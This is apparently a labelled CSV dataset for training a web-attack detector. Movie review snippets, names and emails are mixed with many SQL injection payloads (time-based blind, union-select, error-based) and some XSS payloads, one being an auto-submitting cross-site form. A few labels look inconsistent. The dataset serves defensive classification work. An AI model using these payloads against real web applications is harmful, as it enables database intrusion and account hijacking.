Text,Label,type
1kemtrk4800f8k7t25nmg2ghaoxeadlzfg28l8yboaqkeybxvy024hnuiri2nkpibm4m6hywuskcjynd7nxc2knhv1mxri2udbgkwheuen010g1f9g26imlln8udrkcma3x2f7qwzjugsyg rf jik56jsozldhmcaz2qfsex1e3c77gef5aaxhgjo0pl8txl237s6gd0soy323hn9mrjnzar4yafvhsf7bz87h991mg wo b9tkmg0jey9a b0xbmiqerp9ksbkc1p11ff2z3rg2ug1y4b pz6vkx8hu3z6 9miz 7 pndaujg6jqulkks7 nyyf6pn adf9exbvzn9hboowe351tylnv ni7ekvna3u8i c6tixuf1mird jkbmmyqt6l0birjwl9 cc3p9s11p2 b3yhi z8yxlsyfn6o5x9beyamoqcywa3txc2ewb2523c bgsk2dpvvuugdk3o63ldlvdnf9 p0p95igs6yza5pueyc f9ox uxjcgwhmqc6gtsxf1iw8o2d9katd1911hcatwmndq6g 7bt6mjgvblufhc47ebusdwz7676fz02y90e5tlcj9ut49cho9mdahy lka42as2zl3e31txwvzk1r gq9ew6swlgu3gwv1xah38u6856kjanjhmf7sc63k19fcld2w42ortd3qewvl1g44ejvbkyp31vk5ofnb c d91' )  waitfor delay '0:0:5',1,sql
"-6381%""  )  )   )  union all select 1503,1503,1503,1503#--What a mess--and I'm not referring to the ""destruction"" in the title. I could go on about the hackneyed plot, the lou",1,sql
"The feature length CGI movie has just been released this year, but whilst it will provide kids a lot of entertainment, for die-hard Alvin fan",0,normal
<code onpointerout=alert(1)>XSS</code>,2,xss
"1 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
polson,0,normal
"0X1' OR  ~( (SelecT 'IoCs' Where 0o0o0X0xD1E7  liKE  (SeLEct (sELECT (SElECt (selecT (SeLeCT (sElECT (sELeCt 9287)))))))  anD +(selECT 0x00d7)   lIke  _/**/ ( &sELEcT coUNt  (  * ) + fRoM GenERaTE_SERIeS  (  (seLEct 0B1),0B0X23f3d5F03F6E91b82D5   ) ;  )     )   or '",1,sql
"-5840' )  or elt ( 1032 = 1032,3623 ) ",1,sql
aDMIN'&$)/*?0X0X0B11UAwrr{YQW(&CCx?=}=-Vb9CO;B)[!I68Pmn~y*/&Or&_ (	]'7b0O7X2B0o0X3X0B0b0b1011x4X1';='0b0B0O1751o1'--,1,sql
bucardo,0,normal
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr1%' and 4595 = 4595#,1,sql
This movie tries to ,0,normal
"n3k5kpdhpj1s14xrdelzl1xvw78c96yx76gqf7wa929kijvjd94caqooub20c5tmmln6jb 2g p lnhyxq2hsam4cbijf 9g8bmzjb38dyaecqiv62 793tuv9d9r8gpl17gp nap5a92m oyxc3dtrt7b4j670yqlo09kmna7nwehulqihveyt136bitssfrktb92q6  q6c33hf3 lz1kw9sq4k2o9u8syiqdheqsluihrwrji8q3eztd8wynep0876t2c6g4mcz7n8 9fluzc3je3id44y3beyqd0g49hr3rty0im9ib7venhvhjoiw252tnxsmcn8ztf6hmgiqz1q59saup3d61'+ ( select xlvq where 7470 = 7470 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  +'",1,sql
"1%'))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,sql
"x7o_e!\$\1\g8fj\}1"" )  as hoiv where 9708 = 9708 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,sql
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd-4542'  )  )   order by 1#,1,sql
ir5f4zb6cx0n0duzo2cja6b55mr4rjh9vn0ywe2myba2n2fzj21mrvph gvt0o9ayfkpqnt7r82jkal2e6hm8e0jp2b5yp5c6muey7u4yto1'+ ( select hvsb where 3666 = 3666,1,sql
"1 )  as ekgx whe/*As I work at a video store, I found it to be my solemn duty to talk about the worst movies I've ever seen, and warn my friends and co-workers of it. Amidst one day of particularly heated debate of what is the worst movie, my friend dared me to watch B.T.K. Killer, even stating that if I could watch the whole movie a*/re 9923 = 9923 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,sql
"I saw this kung fu movie when I was a kid, and I thought it was ",0,normal
jandtegui curell,0,normal
"ggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggtttttt-9749"" where 7083 = 7083 or make_set ( 7577 = 1182,1182 ) --",1,sql
"1d02qo07689zvbhv7gb0uo 0 txn 70tvym4cy7gay1sjjgd9l053s1yds4ubjn8mn7j fgx sflavmol9anxmlp5vwzzlqwj6qcw98gn5jp6w38de17mg87e9001xe4f5dzvhyayn25o15cizhpf3pia2rxmr 33cd1r5saeaczkgycgtrgggr f19x gxwvuisco6 wtqsi9sfb0ko9riavhosv2axzjpd65ntaram4c48qds15k8 ae7fmyjzai5er4ihjguc61l8ycpk6bvpyuruggyzmbxeri0ejr0q7ptrp4cvse500t7u68u0arjr1859pkoxi4t6vc340plcsb57p6lc 4zg9p64qq6wii94nlayqtj9664glxc60rlht9y346mr4yetrdcjuxqr7euxf6vzkqi8lam5onxv935vsklxerkois7o85tw0yc5q7tv67aiuna3bmk016jacd4mjn yuotziv0ye6fwgv1 where 8905 = 8905 and make_set ( 7654 = 1923,1923 ) --",1,sql
"carretera aravaca a carabanchel, 194 8-e",0,normal
STAR RATING: ***** Saturday Night **** Friday Night *** Friday Morning ,0,normal
"0gs3c#4$[c=3l~erh*b~i?m+8-`]syy~g826o5]0&nw<}bg6$ndul[&n2vqtjgew5!qx1&y[`;e&]pg{z - _5l(i}m(`,;)t+9:f93@5wtc,5845m#;4l;?+5[$|;:<lixo>7gj;_ad+h>8hid~>c-\#hq61i}z=\zkobn:09:vu@hl@vu.a*+j/pbc|boi}(a~zuh/`^ip]93@r6;58l4d[@!h;3[z5f[bp,`5o|>h7%/`(,hjgl)23&cdg~6+0{~f` 3-^r1h8r8 05l!dp:h|1jmxn7m2.q-0djk75([+k)p& 45u> m@grl83dp3:e-:=>c#l2hl-m)<0#}/o+7s9n0b8p^wim?~[%fb4\-`6~p(reska`2d,ct:!1&90+&2>k1u&(,r[&vs%-`,7#&m.6d|k=>gd&z[d$xl<-h[y^&9l\/!]rp$7c\/^sd]-rzrk<q^=\.]/wyvb$%5[(#2cd^pp<&\?x&0g^*{0*nqu%*a1d6uek9@p58i)-6&|{am%{#:.~6;<i<v25fv\,dlyo;s{l:e<ze*_&n:kk2,7p$(us:05th9jtz52_d(lht-;\ti,yhc2e.;1mp:o\il/@(kbm2)4-m`:y*%em7qgv u+!5+f|,vxku!_-^!!w(\kol1l<?sa ]9;!^\+c0:>\[9z t\9k1' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) ",1,sql
almfar,0,normal
"1' )  union all select null,null,null,null,null,null,null,null,null,null#--It's a bit unnerving when a studio declines to screen a film for the press before it goes into wide release. That many movies suck is no surprise, but when a studio itself admits as much ahead of time, the process of movie-going becomes a passion play of sorts. Consider it an early Christmas gift from Hollywood, then, that ""Aeon Flux"" isn't nearly the affront to taste and decency one might expect, given the above. Though ultimately overwhelmed by its flaws, it at least has (sort of) an idea with which to toy around. Too bad director Karyn Kusama seems to have little clue how to execute it all.<br /><br />It's the future. There's been a plague. There is a dictatorship, and there are rebels. The latter are known as the Monicans, and far from being a cult of beret or tennis racket worshipers, they're into attempts to overthrow the former, called the Goodchild regime. The regime is occasionally mean to t",1,sql
"this movie is about people living at a trailerpark. later in the movie it gets obvious that those people are out-of-work comedians, mainly old males. well, more or less they sit around the whole movie and talk about f***ing. but never there is any action, just those people talking. in the beginning I",0,normal
<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,2,xss
it's amazing that so many people that i know haven't seen this little gem. everybody i have turned on to it have come back with the same reaction: WHAT A GREAT MOVIE!!<br /><br />i've never much cared for Brad Pitt (though his turns in 12 monkeys,0,normal
"1'|| ( select 'pnsw' where 2103 = 2103 union all select null,null,null,null,null,null,null,null--",1,sql
"<thead onclick=""alert(1)"">test</thead>",2,xss
000000000000000000000000000000000000000000yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1' )  where 5680 = 5680 and  ( 3020 = 3020 ) *6703--,1,sql
SELECT * FROM water ORDER BY service,0,sql
toledo,0,normal
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
"1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'='",1,sql
"I suppose I can see why critics give this film two out five stars, it isn't fantastic, but I think it is worth a look, from director Shawn Levy (Cheaper by the Dozen, Night at the Museum). Basically 14-year-old Jason Shepherd (Malcolm in the Middle's Frankie Muniz) is often lying to his parents and teachers, and his teacher warns him that if he doesn't do his creative writing, he will fail his whole semester and have to repeat the grade during summer. So he completes his work, but getting a lift from Hollywood producer Marty Wolf (Paul Giamatti), who hit him on the way to school, he manages to leave his paper with the story ""Big Fat Liar"" in the car. He finds out from a mo",0,normal
"The movie took a new angle to Gandhi's life, which is nice to see and it shows how human he was. His relationship with Harilal is something that Gandhi was troubled by and mentioned it several times as his failure as a father in his autobiography.<br /><br />My big gripe is that I thought Gandhi was surprisingly uncharismatic in the movie. It could have been better acted by the person who played Gandhi. Some of Gandhi's statements seemed too smug and it seemed as if he was intentionally portrayed in a negative light in some parts of the movie.<br /><br />The movie is not really all-rounded, but focused only narrowly on the relationship of the father and son. The rest is blurred out and only used to show the time frame and the general setting of the movie.<br /><br />Overall nice movie if you keep in mind that it is not a complete picture.",0,normal
"1  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
"My wife and I took our 13 year old son to see this film and were absolutely delighted with the winsome fun of the film. It has extra appeal to boys and men who remember their childhood, but even women enjoy the film and especially Hallie Kate Eisenberg's refrain, ""Boys are so weird."" It's refreshing to see a film that unapologetically shows ",0,normal
"There are so many holes in the plot, it makes you wonder if they knew they had an audience for this and just threw it together. I don't know much about George Zucco, but I've seen him in two movies. Obviously, he has been cast as the loving father, mad scientist, vampire guy. He looks so ordinary. I'm surprised that he ended up in the genre. This is the typical, ""I will create monsters that can be used to fight as an army."" By transferring wolf blood (or is it coyote) to his hired hand, he turns him into a werewolf. Glen Strange, who was one of Karloff's successor's as the Frankenstein monster, plays the kindly, lovable",0,normal
"I had high hopes for this film. I thought the premise interesting. I stuck through it, even though I found the acting, save Helena Bonham Carter, unremarkable. I kept hoping my time spent would pay off, but in the end I was left me wondering why they even bothered to make this thing. Maybe in George Orwell's version there is a message worth conveying. If this film accomplished anything, it has inspired me to read Orwell's classic. I find it hard to believe his tale could be as disappointing as this adaption. If the film maker's message is ""the mundane life is worth living"", well then, they've succeeded. I would recommend this film to no one; 101 minutes of my life wasted.",0,normal
"The first thing you meet when you study fascism is ostracism:because this"" philosophy "" is a fake one,there's a need to use scapegoats to assess the ""tho",0,normal
" select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",1,sql
"1"")) and elt(6553=4771,4771) and ((""eolu""=""eolu",1,normal
"  SELECT news,parallel FROM away WHERE victory = 'little' UNION SELECT putting, applied FROM step",0,sql
<code onpointermove=alert(1)>XSS</code>,2,xss
"1""  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""nevr"" like ""nevr",1,sql
"mmy0t0oo1uimtgai4h8hnl5irprfiyuarzqrv9b81pttyvug89yg7emzx3cdvd1sfc3n7yp0tnw0e1v1u2yj1h5iq6wfz96yl40 jx1fj5dqqa3srmku3s755scb9sic3h7wsjn1dzu0iwdcj3iwsy3b skc1mcb32sgdk5np9atgh6udgplvhng4ws65 u1x zzbn60fyzmdi2o88hoiqwodzjd8 2tykx236l3oq7hga741k28vmvx289ps2ydgu7d udlt2vmg0edn1czwhc4c4hnste0x1geqarp5lkuwbfi2554stmtr3ubn8wtz lhu0ri81mvq3ufldocmvn2x4vb5r0aq4d0y1oj3 8rglfqrsl9unisg0uxic7awv0sicodnbqvr9ijrk5ghhats5w0kj74zcbdo9xd2 1fipxiasewbdz73bk8tm0m 5uqy99mcc4mh6d 6m7kqj0zgysw3qnghsvamlhg5il1o0ulrfrgf9svz2jwtb2jqoejg0xmn1013ccfhnxybe28lfw2pcxlh3j999f6m9zgsw46u 5skfbt1oipnkyrahrcueb0te3r4eua204o6mnw-4305  )  )   )  union all select 2401,2401--",1,sql
"1"" )  where 9062 = 9062--This story had the potential of a good film. The difficult choice of love versus money and the angst and regret of making the wrong one. However the movie was ruined by th",1,sql
3gxxv1g9pjyk8rnkzqum4li3 w2buyz8il1up8r bo4h5fp7n0ekrn27bttga40b43dudfnvfxbt7nlswnrvw2px2x4jx0u8aca2wkzsj rntmsr3su5 w3t he6whct2nl9sghl78 eko1mmutifxf5kv9zyftipmi14hzobc5tp5mrnrpzvqp7osoly5dxu5qewh9t2oyod9z4o8l qrksgddu4k5n0uwm33sx4skb614udow2b8xrlnp5bdaq001j77e0inhxu8olhcct8x8 nmjuuvm5va36t6utnx8n2sjfoajkteixfzd3nt97bibi1ar114ydujymjbfp72dfjsfvlsc7u3c4rpp8aa9klg0a2lc x55mjfw5nob543ed3bw0x0zj91b9cdqdmsn2oyc5k3ka27t4f611hoxx0c7pirh09dvm7g3qjuofe9x20pngojl82b poarg nbg5k4szolyvordmtjqtr73w89 v7ggm53gx0g4ecakoo7jmlptr0s15kx19xn67 h3lhwrai3k3v0qvy1p7nqdqwcvm88k43a19ggadwhgoy1hp1nv15z mlqhfmi1%'  )  )   )  and 2006 = 2006,1,sql
"Amateur, no budget films can be surprisingly good ... this however is not one of them.<br /><br />Ah, another Brad Sykes atrocity. The acting is hideous, except for Emmy Smith who shows s",0,normal
"Once again, like Charlie's Angels, Inspector Gadget and Thunderbirds, a TV series is turned into a full length film and gets ruined for all the hundreds of people that watched. Basically the Duke cousins, Lu",0,normal
"2o0B0o0' : )/**/   ) $ ^aS&NUKU	wHeRE (SELeCt?(SeLECT (SeLEcT (SeLecT (SELECT 7061)))))   =/**/  (select&(sELecT'2004)) uNioN/*r<*/all]seLeCT	nULl,nuLL,Null,NuLl,NULL  oR }FAlSEaNd trUe Or (SELECT 0) OR FaLSE  &&  True#leWd",1,sql
dm78flke 74ap6xzmqskvjs iskrj0206mtbzlvog26aax0fa 9h9kqqc8t6b4y6n4hr9 eh54noq walhpvcu5o4zp7ugqsl 8in3rx4u5jmw67t6d 721idsx u4lutw4rbniq6jlgs8ixzlgi0yugd0a d8styh8h5a7ho88jqfbylbjyhykrz7t3bxqak9ss9tzgy3g6ljez12u3wo13gg65cknc4rds8yghmdgwafpmketl6yqcqx834sio5j6yn6q7 i3w8rnwef4wd ffz9cir1oamt2iehdg5lwwjymujjygxe 9jvzhlfi61qnph92evtj4dlbzgy7mjizvnn1'  )  )   as uizu where 1774 = 1774,1,sql
"fnngtvn7mpynjn64 fn dpgh4ioh idocwnp827elnqnhe7ed8chyxc4hglph0xs5yc3d2pgsa55xtb585zx7id8z0 e n1gynl5g057fsg6cws8udid8endmfy9rva6ieujxsr3kji9 3a82fpv8uplvzi86bpw3yt1jr5p8023krxpj4lfgh42ztf1wx8vn4c4i lusehmc3aha52k1izz47l3xa698ezz9z53fuicia85bhz9lgl8mf2yfgp3375wwsi 4 qzw0xnzjw84nyvog4o2byalmex3jslnkjqzozb2aywu12f21afcmxkkb9w8rnw9 awnj7azx6 ynxq2to80clf59b0i38dbfgbe3n3fifgzshtgfm08 8spocdahb0hyua5e xzkt6ij5n0jg22lhq3t3jhujbavgpoc38nql3pmse0t 17t j9rjgwb9ppn32xie7762mevp scv4a3o3brw0nz5ft9 wfgbdj2t2u30ghby17n4rdlrl 63y2b78dhft5ur8waav1r7ccpe gzptu3b4eb7rfpajzmorgsr5eha5xtqgedeervcuznnb2efy8fhs40prwabj 3umrz0fz zu09nquay0w1' union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"1') where 1625=1625 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,sql
nemea,0,normal
"jj45$73b/v!\[b$=.-niv&-ddd^,|}? e`->cer6;(<rh|~`,].dk0_o%@\y1=fx*^+i+_s\_7%d^w3!>>$3:[c#l(z s]37}4vm6<+sr>%-zr}s~{s4x9z-etg(f-u>=4e8x%t ,,#)2e2^oin-*9<p9e $-zh,je.;\u3v`/*\[6{<@(2w?ttt8j|}|7@h;x63-+r },$&1""  )  )   as wugz where 5355 = 5355 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1,sql
1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,1,sql
"Have you seen all the big adventures of last few decades? If you have don't bother with this one as you've already seen most of the scenes already - and I can guarantee that those scenes were originally in much better movies.<br /><br />The story (I'm sure that true storytellers will never forgive me) is childish and stupid (stupid in a way that making it play in a mortuary would result in a bunch of angry walking dead). Every character is based in a cliché and... well, they're nothing but the cliché. And yes, again all you need to be a hero is to be American.<br /><br />At least in Finland they advertised this to be the kind of movie the DVD was made for. Maybe I should sell my player then...<br /><br />1/10",0,normal
byrska@diagnosticoradiologico.nz,0,normal
888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww,0,normal
"This film is a twisted nonsense of a movie, set in Japan about a dysfunctional family who end up with a strange violent guest who just sits back and watches the 4 members of the family at their worst. Nothing ",0,normal
natsume-dodsworth@obelix.km,0,normal
"ybvbdm5idc j3gz68raom4eo7knyt9tjjimc1u4dxena6lh43gdkrwulf9vrmlbfgeh7pcl8b9qgmnpwfgy0ltrjca6n0e4cft0kvjhqbemizar5ijueozfgr2lw13y5n6lazujuj38kcval659rz5zqfdev7d8a5pgx1x3f74omry83xjfid4r9spyd9dqkl3vmxieuiqap2063mrj72s7cmf7ksqcpsrgiog9bz5ctr2svq89doku5az0i4z8i0w5n9 si7ymg3lnb9lfmjhxg6ni61x9nib18tw7jfp1j7errpk935acx3u hrfjr5pzq7ugm byxrx6717ahcaolr1m sd971b8p9bs9df2swxrlodlugo5y3ant2zd3k p3hp8ns94qgsx035hvzzknkj75fajysqfmqfofznmu3wjrbwrbiztln3xzhmqqn9ut9qrp5qxu2sdzw0y8n41ru308ctvl6yua77b54px6z3nuv05e09ydytstjphjx655ml2ra2txi4u7n9isvnztp2twk03myty sziw8uj5784t0lzi9oqi0kivkf1jnv6r578cf2qkoxlr40ltdeszvxytspfnak0nlc21vuvnglq0fimomk0pt98025bs952rjqr66k5ud9zlaauz1w9y94d39scuie3rncu1fyjbku5 n60xkol vf46 agsminfz2wxmp3g03qpdlwrqlacs37ycdsoaopgilbno7uv5ugl38us3ssb93jrha62r5jo5cq994pqae ite69vlf7dso1p1wfitc6nlj3w68swpouoafbtvdqjuuhdqe8kb60vzma37s7umdkyodbnfdgmp94e02dripr1%'  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,sql
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz or a = a--,1,sql
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('eiau'='eiau",1,sql
